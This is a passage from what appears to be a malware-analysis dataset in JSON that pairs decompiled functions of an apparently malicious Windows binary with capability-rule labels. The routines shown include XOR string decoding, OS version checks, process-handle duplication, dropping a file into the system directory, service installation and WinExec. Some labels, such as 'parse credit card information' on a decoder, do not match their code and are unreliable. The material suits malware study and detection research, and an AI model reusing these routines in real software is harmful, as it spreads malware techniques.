        "rules": [
            "check OS version/55c4336dbd964ae3be35b3597c99c1c2"
        ],
        "decompiled_code": "\n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nbool __cdecl fcn.00401f60(uint s1)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    uint *puVar3;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    (*_sym.imp.MSVCRT.dll__strlwr)(s1);\n    var_14h = 0x411420;\n    var_10h = 0x411418;\n    var_ch = 0x411428;\n    var_8h = 0x411430;\n    var_4h = 0x411438;\n    uVar2 = 0;\n    puVar3 = &var_14h;\n    do {\n        iVar1 = (*_sym.imp.MSVCRT.dll_strstr)(s1, *puVar3);\n        if (iVar1 != 0) {\n            return true;\n        }\n        uVar2 = uVar2 + 1;\n        puVar3 = puVar3 + 1;\n    } while (uVar2 < 5);\n    iVar1 = (*_sym.imp.MSVCRT.dll_strstr)(s1, 0x411410);\n    return iVar1 == 0;\n}\n",
        "token_count": 294
    },
    "004040b0": {
        "rules": [
            "check OS version/55c4336dbd964ae3be35b3597c99c1c2"
        ],
        "decompiled_code": "\nint64_t fcn.004040b0(void)\n\n{\n    uint32_t extraout_EDX;\n    uint32_t uVar1;\n    uint lpVersionInformation;\n    int32_t var_90h;\n    int32_t var_8ch;\n    \n    lpVersionInformation = 0x94;\n    (*_sym.imp.KERNEL32.dll_GetVersionExA)(&lpVersionInformation);\n    uVar1 = (extraout_EDX >> 8 & 0xffff00) << 8 | extraout_EDX & 0xffff;\n    if (var_90h == 5) {\n        return CONCAT44(uVar1, 1);\n    }\n    if ((var_90h == 6) && (var_8ch == 0)) {\n        return CONCAT44(uVar1, 1);\n    }\n    return uVar1 << 0x20;\n}\n",
        "token_count": 189
    },
    "00404130": {
        "rules": [
            "check OS version/55c4336dbd964ae3be35b3597c99c1c2"
        ],
        "decompiled_code": "\nuint32_t fcn.00404130(void)\n\n{\n    int32_t iVar1;\n    uint uStack12;\n    uint32_t uStack8;\n    uchar auStack4 [4];\n    \n    uStack12 = 4;\n    iVar1 = fcn.00403290(0x80000002, 0x4111b8, 0x411204, auStack4, &uStack8, &uStack12);\n    if ((iVar1 == 0) || (5 < uStack8)) {\n        uStack8 = 0xffffffff;\n    }\n    return uStack8;\n}\n",
        "token_count": 132
    },
    "004049d0": {
        "rules": [
            "check OS version/55c4336dbd964ae3be35b3597c99c1c2"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00404d0b) overlaps instruction at (ram,0x00404d0a)\n// \n\nvoid fcn.004049d0(void)\n\n{\n    uint32_t *puVar1;\n    int32_t *piVar2;\n    uint *puVar3;\n    char cVar6;\n    int32_t iVar4;\n    uint *puVar5;\n    char extraout_CL;\n    char extraout_CL_00;\n    uint extraout_ECX;\n    int32_t extraout_ECX_00;\n    int32_t extraout_ECX_01;\n    uint extraout_ECX_02;\n    char extraout_DH;\n    int32_t extraout_EDX;\n    char *pcVar7;\n    uint8_t *unaff_EBX;\n    uint unaff_EBP;\n    uint *unaff_EDI;\n    uint8_t uVar8;\n    uchar uVar9;\n    uint8_t in_AF;\n    bool bVar10;\n    ulong uVar11;\n    uint in_stack_ffffffc8;\n    uint in_stack_ffffffcc;\n    uint *arg_ch;\n    uint arg_10h;\n    uint uVar12;\n    uint32_t uVar13;\n    \n    fcn.00401d70(0x411474, 0x11, 0x410ff0, 0x11);\n    fcn.00401d70(0x411474, 0x11, 0x41120c, 0xf);\n    fcn.00401d70(0x411474, 0x11, 0x41121c, 0x1a);\n    bVar10 = extraout_DH - extraout_CL < '\\0';\n    uVar12 = 0x404a80;\n    iVar4 = fcn.00401d70(0x411474, 0x11, 0x411270, 10);\n    if ((bVar10) || (!bVar10)) {\n        uVar12 = 0xb;\n    }\n    puVar5 = iVar4 + -0x1bf31dd6;\n    *unaff_EBX = *unaff_EBX & 0xc3;\n    arg_10h = 0x41127c;\n    fcn.00401d70(0x411474, 0x11, 0x41127c, uVar12);\n    fcn.00401d70(0x411474, 0x11, 0x411288, 8);\n    fcn.00401d70(0x411474, 0x11, 0x411290, 9);\n    bVar10 = false;\n    fcn.00401d70(0x411474, 0x11, 0x41129c, 9);\n    if ((bVar10) || (!bVar10)) {\n        uVar12 = 9;\n        arg_10h = 0x4112a8;\n    }\n    else {\n        *unaff_EDI = *puVar5;\n        puVar5 = iVar4 + -0x1bf31dd2;\n        unaff_EDI = unaff_EDI + 1;\n        uVar12 = extraout_ECX;\n    }\n    fcn.00401d70(0x411474, 0x11, arg_10h, uVar12);\n    fcn.00401d70(0x411474, 0x11, 0x4112b4, 0xc);\n    fcn.00401d70(0x411474, 0x11, 0x4112c0, 3);\n    uVar9 = (POPCOUNT(unaff_EDI - 1U & 0xff) & 1U) == 0;\n    fcn.00401d70(0x411474, 0x11, 0x4112c4, 10);\n    fcn.00401d70(0x411474, 0x11, 0x4112d0, 0x40);\n    if ((uVar9) || (iVar4 = extraout_ECX_00,  !uVar9)) {\n        iVar4 = 0xc;\n        in_stack_ffffffcc = 0x411310;\n        in_stack_ffffffc8 = 0x11;\n    }\n    puVar1 = extraout_EDX + 0xc;\n    uVar13 = *puVar1;\n    *puVar1 = *puVar1 - 0x68;\n    *unaff_EBX = *unaff_EBX + extraout_EDX + (uVar13 < 0x68);\n    *(extraout_EDX + 0x11) = *(extraout_EDX + 0x11) + (extraout_ECX_00 + 1 >> 8);\n    fcn.00401d70(0x411474, in_stack_ffffffc8, in_stack_ffffffcc, iVar4);\n    fcn.00401d70(0x411474, 0x11, 0x41131c, 0xb);\n    arg_ch = puVar5;\n    fcn.00401d70(0x411474, 0x11, 0x411328, 4);\n    uVar8 = 0;\n    bVar10 = (POPCOUNT(extraout_CL_00 - 5U & 0x44) & 1U) == 0;\n    uVar13 = 0x404c7e;\n    uVar11 = fcn.00401d70(0x411474, 0x11, 0x41132c, 4);\n    pcVar7 = uVar11 >> 0x20;\n    uVar12 = uVar11;\n    if ((bVar10) || (uVar13 = uVar13 & 0xffff | puVar5 << 0x10,  !bVar10)) {\n        uVar13 = 0xc;\n        unaff_EBP = 0x411330;\n        arg_ch = 0x11;\n    }\n    else {\n        puVar3 = puVar5 + 1;\n        out(*puVar5, uVar11 >> 0x20);\n        uVar8 = in_AF;\n        do {\n            cVar6 = uVar12 >> 8;\n            uVar8 = 9 < (uVar12 & 0xf) | uVar8;\n            uVar12 = CONCAT31(CONCAT21(uVar12 >> 0x10, cVar6 - uVar8), -uVar8);\n            puVar5 = puVar3;\n        } while (uVar8 || cVar6 == *pcVar7);\n    }\n    piVar2 = unaff_EDI + pcVar7 * 2;\n    *piVar2 = (*piVar2 + 0x7b) - uVar8;\n    *(extraout_ECX_01 + 0x6a) = uVar12;\n    *unaff_EBX = *unaff_EBX ^ uVar11 >> 0x20;\n    pcVar7[0x11] = pcVar7[0x11] + (extraout_ECX_01 + 1 >> 8);\n    fcn.00401d70(0x411474, arg_ch, unaff_EBP, uVar13);\n    fcn.00401d70(0x411474, 0x11, 0x41133c, 4);\n    bVar10 = false;\n    fcn.00401d70(0x411474, 0x11, 0x411340, 9);\n    if ((bVar10) || (!bVar10)) {\n        uVar12 = 0x16;\n        unaff_EBP = 0x41134c;\n    }\n    else {\n        *unaff_EDI = *puVar5;\n        uVar12 = extraout_ECX_02;\n    }\n    fcn.00401d70(0x411474, 0x11, unaff_EBP, uVar12);\n    fcn.00401d70(0x411474, 0x11, 0x411364, 7);\n    return;\n}\n",
        "token_count": 1803
    },
    "00403ed0": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00403f49) overlaps instruction at (ram,0x00403f47)\n// \n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nuint __cdecl fcn.00403ed0(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h, uint arg_1ch)\n\n{\n    code *pcVar1;\n    uchar uVar2;\n    int32_t iVar3;\n    char *unaff_EBX;\n    uint32_t uVar4;\n    uint *puVar5;\n    uint *unaff_EDI;\n    uint *puVar6;\n    uint64_t uVar7;\n    uchar var_24h;\n    uint var_23h;\n    uint *var_4h;\n    \n    uVar7 = fcn.00403040(arg_18h, arg_1ch, 0x411034, 7);\n    var_4h = uVar7;\n    if (var_4h == NULL) {\n        return 0;\n    }\n    if ((var_4h < 0) || (var_4h >= 0)) {\n        var_24h = 0;\n        puVar5 = &var_23h;\n        for (iVar3 = 7; uVar7 = ZEXT48(var_4h),  iVar3 != 0; iVar3 = iVar3 + -1) {\n            *puVar5 = 0;\n            puVar5 = puVar5 + 1;\n        }\n    }\n    else {\n        *unaff_EBX = *unaff_EBX + (uVar7 >> 8);\n        puVar5 = unaff_EDI + 1;\n        *unaff_EDI = uVar7 >> 0x20;\n    }\n    pcVar1 = _sym.imp.MSVCRT.dll_rand;\n    var_4h = uVar7;\n    *puVar5 = uVar7 >> 0x20;\n    *(puVar5 + 2) = uVar7 >> 0x20;\n    uVar4 = 0;\n    do {\n        uVar2 = (*pcVar1)();\n        (&var_24h)[uVar4] = uVar2;\n        uVar4 = uVar4 + 1;\n    } while (uVar4 < 0x20);\n    puVar5 = &var_24h;\n    puVar6 = var_4h;\n    for (iVar3 = 8; iVar3 != 0; iVar3 = iVar3 + -1) {\n        *puVar6 = *puVar5;\n        puVar5 = puVar5 + 1;\n        puVar6 = puVar6 + 1;\n    }\n    fcn.00404180(arg_8h, arg_ch, arg_10h, arg_14h, &var_24h, 0x20, var_4h);\n    fcn.004028f0(arg_18h, arg_1ch);\n    return 1;\n}\n",
        "token_count": 667
    },
    "00401c70": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1",
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00401cd9) overlaps instruction at (ram,0x00401cd6)\n// \n\nuint32_t __fastcall fcn.00401c70(uint32_t param_1)\n\n{\n    int32_t *piVar1;\n    uint8_t uVar2;\n    uint32_t in_EAX;\n    int32_t iVar3;\n    int32_t unaff_EBX;\n    uint8_t in_AF;\n    uint var_10ch;\n    uint var_8h;\n    uint var_4h;\n    \n    var_4h = 0x104;\n    if ((*0x10 != 0x110) && (*0x10 == 0x110)) {\n        if (&stack0xfffffffc < 0x10c || unaff_EBX + 1 == 0) {\n            iVar3 = in_EAX + 1;\n            *(unaff_EBX + -0x36ccf73b) = *(unaff_EBX + -0x36ccf73b) + iVar3;\n            goto code_r0x00401ce1;\n        }\n        uVar2 = 9 < (in_EAX & 0xf) | in_AF;\n        piVar1 = (in_EAX & 0xffff0000 | CONCAT11((in_EAX >> 8) + uVar2, in_EAX + uVar2 * '\\x06') & 0xff0f) + 0x2a;\n        *piVar1 = *piVar1 - (unaff_EBX + 1);\n    }\n    iVar3 = fcn.00403290(0x80000002, 0x4112d0, 0x411310, &var_8h, &var_10ch, &var_4h);\n    if (iVar3 == 0) {\n        return 0;\n    }\n    iVar3 = (*_sym.imp.MSVCRT.dll__access)(&var_10ch, 0);\n    param_1 = 0;\ncode_r0x00401ce1:\n    return param_1 & 0xffffff00 | iVar3 != -1;\n}\n",
        "token_count": 468
    },
    "00402cb0": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x00402d09)\n\nuint __cdecl fcn.00402cb0(uint arg_8h)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    int32_t iVar3;\n    \n    iVar1 = fcn.00403910(0x41105c);\n    if (iVar1 == -1) {\n        return 0;\n    }\n    iVar1 = (*_sym.imp.KERNEL32.dll_OpenProcess)(0x40, 0, iVar1);\n    if (iVar1 != 0) {\n        uVar2 = (*_sym.imp.KERNEL32.dll_GetCurrentProcess)(arg_8h, iVar1, 0, 0, 0, 2);\n        iVar3 = (*_sym.imp.KERNEL32.dll_DuplicateHandle)(uVar2);\n        if (iVar3 != 0) {\n            (*_sym.imp.KERNEL32.dll_CloseHandle)(iVar1);\n            return 1;\n        }\n        return 0;\n    }\n    return 0;\n}\n",
        "token_count": 226
    },
    "00402d60": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00402d60(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    int32_t arg_8h_00;\n    int32_t iVar1;\n    \n    arg_8h_00 = (*_sym.imp.KERNEL32.dll_CreateFileA)(arg_8h, 0x40000000, 1, 0, 2, 0x80, 0);\n    if (arg_8h_00 == -1) {\n        return 0;\n    }\n    iVar1 = (*_sym.imp.KERNEL32.dll_WriteFile)(arg_8h_00, arg_ch, arg_10h, *0x10 + 4, 0);\n    if (iVar1 == 0) {\n        return 0;\n    }\n    if (*0x4224a4 != 0) {\n        iVar1 = fcn.00402cb0(arg_8h_00);\n        *0x4224a4 = iVar1 == 0;\n    }\n    fcn.00403490(0, arg_8h_00);\n    if (*0x4224a4 == 0) {\n        (*_sym.imp.KERNEL32.dll_CloseHandle)(arg_8h_00);\n    }\n    return 1;\n}\n",
        "token_count": 282
    },
    "00402e40": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00402f02) overlaps instruction at (ram,0x00402eff)\n// \n// WARNING: Could not reconcile some variable overlaps\n\nbool fcn.00402e40(void)\n\n{\n    uchar in_AL;\n    int32_t iVar1;\n    int32_t extraout_ECX;\n    uint32_t unaff_EDI;\n    uint *puVar2;\n    uint16_t in_ES;\n    uint32_t in_stack_0e58be50;\n    uint32_t arg_ch;\n    uint var_80h;\n    uint var_60h;\n    uint var_40h;\n    uchar var_20h;\n    uint var_1fh;\n    \n    arg_ch = unaff_EDI;\n    if ((0x7f < &stack0xfffffffc) && (SBORROW4(&stack0xfffffffc, 0x80) != &var_80h < 0)) {\n        arg_ch = unaff_EDI & 0xffff0000 | in_ES;\n        *(unaff_EDI | &stack0xfffffffc) = in_AL;\n    }\n    iVar1 = fcn.004040b0();\n    if (iVar1 == 0) {\n        return false;\n    }\n    if ((0 < iVar1) && (iVar1 < 1)) {\n        if (extraout_ECX == 0) {\n            fcn.00403490(0, arg_ch);\n            if (*0x4224a4 == 0) {\n                (*_sym.imp.KERNEL32.dll_CloseHandle)();\n            }\n            return true;\n        }\n        do {\n    // WARNING: Do nothing block with infinite loop\n        } while( true );\n    }\n    fcn.00401640();\n    iVar1 = fcn.00403910(0x411054);\n    if (iVar1 != -1) {\n        return false;\n    }\n    fcn.004049d0();\n    *0x4224a8 = 1;\n    iVar1 = fcn.00404010();\n    if (iVar1 == 0) {\n        var_20h = 0;\n        var_80h._0_1_ = 0;\n        puVar2 = &var_1fh ^ in_stack_0e58be50;\n        for (iVar1 = 7; iVar1 != 0; iVar1 = iVar1 + -1) {\n            *puVar2 = 0;\n            puVar2 = puVar2 + 1;\n        }\n        *puVar2 = 0;\n        *(puVar2 + 2) = 0;\n        var_60h._0_1_ = 0;\n        puVar2 = &var_80h + 1;\n        for (iVar1 = 7; iVar1 != 0; iVar1 = iVar1 + -1) {\n            *puVar2 = 0;\n            puVar2 = puVar2 + 1;\n        }\n        *puVar2 = 0;\n        *(puVar2 + 2) = 0;\n        var_40h._0_1_ = 0;\n        puVar2 = &var_60h + 1;\n        for (iVar1 = 7; iVar1 != 0; iVar1 = iVar1 + -1) {\n            *puVar2 = 0;\n            puVar2 = puVar2 + 1;\n        }\n        *puVar2 = 0;\n        *(puVar2 + 2) = 0;\n        puVar2 = &var_40h + 1;\n        for (iVar1 = 7; iVar1 != 0; iVar1 = iVar1 + -1) {\n            *puVar2 = 0;\n            puVar2 = puVar2 + 1;\n        }\n        *puVar2 = 0;\n        *(puVar2 + 2) = 0;\n        iVar1 = fcn.00402b50(&var_80h, &var_60h, &var_20h, &var_40h);\n        if (iVar1 != 0) {\n            iVar1 = fcn.00401000(&var_20h);\n            if (iVar1 != 0) {\n                iVar1 = fcn.00403630();\n                return iVar1 != 0;\n            }\n            return false;\n        }\n        return false;\n    }\n    return false;\n}\n",
        "token_count": 949
    },
    "00402fe0": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00402fe0(uint arg_8h)\n\n{\n    int32_t iVar1;\n    uint *unaff_EBP;\n    uint in_stack_00000018;\n    \n    iVar1 = (*_sym.imp.MSVCRT.dll__access)(arg_8h, 0);\n    if (iVar1 == -1) {\n        return 1;\n    }\n    if (!SBORROW4(iVar1, -1)) {\n        if (SBORROW4(iVar1, -1)) {\n            *unaff_EBP = in_stack_00000018;\n            return in_stack_00000018;\n        }\n    }\n    return 0;\n}\n",
        "token_count": 147
    },
    "00403630": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00403838) overlaps instruction at (ram,0x00403833)\n// \n// WARNING: Removing unreachable block (ram,0x00403675)\n// WARNING: Removing unreachable block (ram,0x0040367d)\n\nint32_t fcn.00403630(int32_t param_1)\n\n{\n    uint32_t uVar1;\n    uchar *arg_ch;\n    int32_t iVar2;\n    uint32_t extraout_ECX;\n    int32_t unaff_EBX;\n    uchar *puVar3;\n    int32_t iVar4;\n    uint *puVar5;\n    uint arg_8h;\n    uchar uVar6;\n    bool bVar7;\n    float10 fVar8;\n    uchar uStack532;\n    uint uStack531;\n    uchar uStack272;\n    uint uStack271;\n    uchar auStack8 [4];\n    \n    puVar3 = &stack0xfffffffc;\n    uStack532 = 0;\n    puVar5 = &uStack531;\n    for (iVar2 = 0x40; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar5 = 0;\n        puVar5 = puVar5 + 1;\n    }\n    *puVar5 = 0;\n    *(puVar5 + 2) = 0;\n    uStack272 = 0;\n    puVar5 = &uStack271;\n    for (iVar2 = 0x40; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar5 = 0;\n        puVar5 = puVar5 + 1;\n    }\n    *puVar5 = 0;\n    iVar4 = 1;\n    *(puVar5 + 2) = 0;\n    uVar6 = 0;\n    (*_sym.imp.KERNEL32.dll_GetSystemDirectoryA)(&uStack532, 0x104);\n    iVar2 = (*_sym.imp.MSVCRT.dll_sprintf)(&uStack272, 0x411010, 0xec, param_1);\n    if ((uVar6) || (!uVar6)) {\n        arg_ch = auStack8;\n    }\n    else {\n        arg_ch = iVar2 + 0x7c8ecb0d + (uVar6 == false);\n        *0x43d1773b = *0x43d1773b ^ 0x8d27e95e;\n        puVar3 = &stack0xfffffffd;\n    }\n    fcn.004015b0(puVar3 + -8, arg_ch);\n    iVar2 = fcn.00403ed0(param_1, *(puVar3 + 0xc), *(puVar3 + 0x10), *(puVar3 + 0x14), *(puVar3 + -8), *(puVar3 + -4));\n    if (iVar2 == 0) {\n        return 0;\n    }\n    *0x4224a4 = fcn.00401c70();\n    iVar2 = fcn.00402d60(puVar3 + -0x10c, *(puVar3 + -8), *(puVar3 + -4));\n    if (iVar2 == 0) {\n        return 0;\n    }\n    bVar7 = unaff_EBX + 1 < 0;\n    fVar8 = fcn.00402ac0();\n    if ((!bVar7) && (bVar7)) {\n        *(param_1 + 0x1c) = fVar8;\n        iVar4 = 6;\n    }\n    iVar2 = fcn.00403910(0x411048);\n    if (iVar2 == -1) {\n        iVar2 = fcn.00403910(0x41103c);\n        uVar1 = iVar2 + 1;\n        if (uVar1 == 0) {\n            arg_8h = *(puVar3 + 8);\n            goto code_r0x00403821;\n        }\n        uVar6 = 0xf;\n    }\n    else {\n        uVar6 = 0xe;\n    }\n    arg_8h = *(puVar3 + 8);\n    iVar2 = fcn.00403c60(arg_8h);\n    if (iVar2 != 0) {\n        fcn.00403c90(uVar6);\n        fcn.00403280(uVar6);\n        return 1;\n    }\n    uVar1 = *0x4224a4;\n    if (*0x4224a4 == 0) {\n        return 0;\n    }\ncode_r0x00403821:\n    bVar7 = (POPCOUNT(uVar1 & 0xff) & 1U) != 0;\n    if ((bVar7) && (!bVar7)) {\n        do {\n    // WARNING: Do nothing block with infinite loop\n        } while( true );\n    }\n    iVar2 = fcn.00403210(arg_8h, puVar3 + -0x10c);\n    if (iVar2 == 0) {\n        iVar4 = 0;\n    }\n    if (((extraout_ECX & *(extraout_ECX + 0x87cb1757)) != 0) && (iVar2 = fcn.004018d0(arg_8h),  iVar2 == 0)) {\n        iVar4 = 0;\n    }\n    if (iVar4 == 0) {\n        iVar4 = fcn.00401af0(arg_8h, 0);\n    }\n    if (iVar4 != 0) {\n        fcn.00403280(0xffffffff);\n    }\n    (*_sym.imp.KERNEL32.dll_Sleep)(1000);\n    (*_sym.imp.KERNEL32.dll_WinExec)(0x5c, 0);\n    return iVar4;\n}\n",
        "token_count": 1282
    },
    "00403910": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00403910(uint arg_8h)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint *puVar4;\n    uint var_12ch;\n    uint var_128h;\n    uint var_124h;\n    uint var_108h;\n    uint var_4h;\n    \n    var_4h = 0xffffffff;\n    iVar2 = (**0x422498)(2, 0);\n    if (iVar2 == -1) {\n        return 0xffffffff;\n    }\n    var_12ch = 0x128;\n    puVar4 = &var_128h;\n    for (iVar3 = 0x49; iVar3 != 0; iVar3 = iVar3 + -1) {\n        *puVar4 = 0;\n        puVar4 = puVar4 + 1;\n    }\n    iVar3 = (**0x42249c)(iVar2, &var_12ch);\n    pcVar1 = _sym.imp.MSVCRT.dll__stricmp;\n    do {\n        if (iVar3 == 0) {\ncode_r0x004039c9:\n            (*_sym.imp.KERNEL32.dll_CloseHandle)(iVar2);\n            return var_4h;\n        }\n        iVar3 = (*pcVar1)(&var_108h, arg_8h);\n        if (iVar3 == 0) {\n            var_4h = var_124h;\n            goto code_r0x004039c9;\n        }\n        iVar3 = (**0x4224a0)(iVar2, &var_12ch);\n    } while( true );\n}\n",
        "token_count": 361
    },
    "00404010": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nuint fcn.00404010(void)\n\n{\n    int32_t iVar1;\n    uint var_4h;\n    \n    iVar1 = fcn.00401e00(0x410ff0);\n    if (iVar1 != -1) {\n        (*_sym.imp.KERNEL32.dll_CloseHandle)(iVar1);\n        return 1;\n    }\n    return 0;\n}\n",
        "token_count": 97
    },
    "00401d70": {
        "rules": [
            "parse credit card information/330c87771d2c420b9aab664e2b442302"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00401daf) overlaps instruction at (ram,0x00401dab)\n// \n\nvoid __cdecl fcn.00401d70(int32_t arg_8h, int32_t arg_ch, int32_t arg_10h, int32_t arg_14h)\n\n{\n    uint8_t uVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    uint8_t uVar4;\n    int32_t *in_EDX;\n    uint16_t unaff_BX;\n    int32_t iVar5;\n    uint8_t in_AF;\n    bool bVar6;\n    unkbyte10 in_ST0;\n    unkbyte10 in_ST1;\n    unkbyte10 in_ST2;\n    unkbyte10 in_ST3;\n    unkbyte10 in_ST4;\n    unkbyte10 in_ST5;\n    unkbyte10 in_ST6;\n    unkbyte10 in_ST7;\n    \n    iVar5 = 0;\n    if (0 < arg_14h) {\n        do {\n            bVar6 = ((CONCAT11(arg_14h >> 8 & in_EDX >> 8, arg_14h) * 2 | in_EDX) ^ 0x6c00 ^ unaff_BX) < 0;\n            uVar4 = *(iVar5 + arg_10h);\n            if ((bVar6) || (iVar2 = arg_14h,  !bVar6)) {\n                iVar2 = iVar5;\n            }\n            *(iVar2 + -0x7ce92414) = in_ST0;\n            uVar3 = iVar2 - 1;\n            in_AF = 9 < (uVar3 & 0xf) | in_AF;\n            uVar1 = uVar3 + in_AF * '\\x06';\n            *in_EDX = *in_EDX + -0x3974207c;\n            in_EDX = CONCAT44((uVar3 >> 8) >> 0x17, \n                              uVar3 & 0xffffff00 | uVar1 + (0x90 < (uVar1 & 0xf0) | in_AF * (0xf9 < uVar1)) * '`') %\n                     arg_ch;\n            uVar4 = uVar4 ^ *(in_EDX + arg_8h);\n            unaff_BX = unaff_BX & 0xff00 | uVar4;\n            *(iVar5 + arg_10h) = arg_14h ^ uVar4;\n            iVar5 = iVar5 + 1;\n            in_ST0 = in_ST1;\n            in_ST1 = in_ST2;\n            in_ST2 = in_ST3;\n            in_ST3 = in_ST4;\n            in_ST4 = in_ST5;\n            in_ST5 = in_ST6;\n            in_ST6 = in_ST7;\n        } while (iVar5 < arg_14h);\n    }\n    return;\n}\n",
        "token_count": 633
    },
    "00403210": {
        "rules": [
            "parse credit card information/330c87771d2c420b9aab664e2b442302"
        ],
        "decompiled_code": "\n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nuint __cdecl fcn.00403210(uint arg_8h, uint arg_ch)\n\n{\n    uint hSCManager;\n    uint uVar1;\n    uint var_4h;\n    \n    hSCManager = (*_sym.imp.ADVAPI32.dll_OpenSCManagerA)();\n    fcn.00401cf0(hSCManager, arg_8h);\n    uVar1 = fcn.00402a40(hSCManager, arg_8h, arg_ch);\n    (*_sym.imp.ADVAPI32.dll_CloseServiceHandle)(hSCManager);\n    return uVar1;\n}\n",
        "token_count": 141
    },
    "00404d60": {
        "rules": [
            "parse credit card information/330c87771d2c420b9aab664e2b442302"
        ],
        "decompiled_code": "\n// WARNING: Control flow encountered bad instruction data\n// WARNING: Instruction at (ram,0x00404fe6) overlaps instruction at (ram,0x00404fe4)\n// \n\nvoid fcn.00404d60(void)\n\n{\n    int32_t *piVar1;\n    uint32_t *puVar2;\n    uint8_t *puVar3;\n    uint32_t uVar4;\n    char **ppcVar5;\n    uint32_t uVar6;\n    uint8_t uVar7;\n    uint32_t uVar8;\n    char *pcVar9;\n    int32_t iVar10;\n    uint16_t extraout_CX;\n    uint8_t uVar11;\n    uint extraout_ECX;\n    int32_t extraout_ECX_00;\n    int32_t extraout_ECX_01;\n    uint32_t unaff_EBP;\n    uint *unaff_ESI;\n    uint *unaff_EDI;\n    ushort in_SS;\n    bool bVar12;\n    bool bVar13;\n    uchar uVar14;\n    ulong uVar15;\n    uint *puVar16;\n    uint in_stack_ffffffdc;\n    uint uVar17;\n    uint uVar18;\n    uint uVar19;\n    \n    bVar13 = false;\n    fcn.00401d70(0x411474, 0x11, 0x41136c, 0x20);\n    if ((bVar13) || (!bVar13)) {\n        uVar19 = 0x26;\n        in_stack_ffffffdc = 0x41138c;\n    }\n    else {\n        *unaff_EDI = *unaff_ESI;\n        unaff_EDI = unaff_EDI + 1;\n        uVar19 = extraout_ECX;\n    }\n    fcn.00401d70(0x411474, 0x11, in_stack_ffffffdc, uVar19);\n    fcn.00401d70(0x411474, 0x11, 0x4113b4, 8);\n    fcn.00401d70(0x411474, 0x11, 0x4113bc, 0x19);\n    fcn.00401d70(0x411474, 0x11, 0x4113d8, 0xb);\n    fcn.00401d70(0x411474, 0x11, 0x4113e4, 0x12);\n    do {\n        uVar8 = fcn.00401d70(0x411474, 0x11, 0x4113f8, 0x12);\n        bVar13 = false;\n        uVar14 = 0;\n        bVar12 = (POPCOUNT(unaff_EDI & uVar8 & 0xff) & 1U) == 0;\n        uVar19 = 2;\n        fcn.00401d70(0x411474, 0x11, 0x41140c, 2);\n        if ((bVar12) || (!bVar12)) goto code_r0x00404edf;\n        ppcVar5 = segment(in_SS, *0x10 + -0x1c);\n        pcVar9 = *ppcVar5;\n        if (bVar13) {\n            *pcVar9 = *pcVar9 + pcVar9;\n            *(extraout_ECX_00 + -0x55) = *(extraout_ECX_00 + -0x55) + (pcVar9 >> 8);\n            return;\n        }\n    } while (bVar12);\n    uVar14 = 0;\ncode_r0x00404edf:\n    puVar16 = 0x411474;\n    fcn.00401d70(0x411474, 0x11, 0x411410, 8);\n    if ((!uVar14) && (uVar14)) {\n        *puVar16 = uVar19;\n        return;\n    }\n    fcn.00401d70(0x411474, 0x11, 0x411418, 8);\n    fcn.00401d70(0x411474, 0x11, 0x411420, 6);\n    uVar18 = 0x411428;\n    uVar17 = 0x11;\n    uVar19 = 0x411474;\n    uVar15 = fcn.00401d70(0x411474, 0x11, 0x411428, 7);\n    iVar10 = uVar15 >> 0x20;\n    piVar1 = iVar10 + 7;\n    *piVar1 = *piVar1 + -0x68;\n    puVar3 = extraout_ECX_01 + uVar15 * 2;\n    *puVar3 = *puVar3 ^ uVar15 >> 0x20;\n    pcVar9 = iVar10 + 0x11;\n    *pcVar9 = *pcVar9 + (extraout_ECX_01 >> 8);\n    fcn.00401d70(0x411474, uVar19, uVar17, uVar18);\n    fcn.00401d70(0x411474, 0x11, 0x411438, 6);\n    uVar18 = 0x25;\n    uVar17 = 0x411440;\n    uVar19 = 0x11;\n    while( true ) {\n        uVar8 = fcn.00401d70(0x411474, uVar19, uVar17, uVar18);\n        if ((*0x10 < 0) || (*0x10 >= 0)) break;\n        iVar10 = uVar8 + 0x68086a2f + (0xffffffbf < &stack0xffffffc0);\n        uVar19 = 0x6a004114;\n        puVar2 = iVar10 + 0x74;\n        uVar6 = 0x97f795d0 < uVar8 || 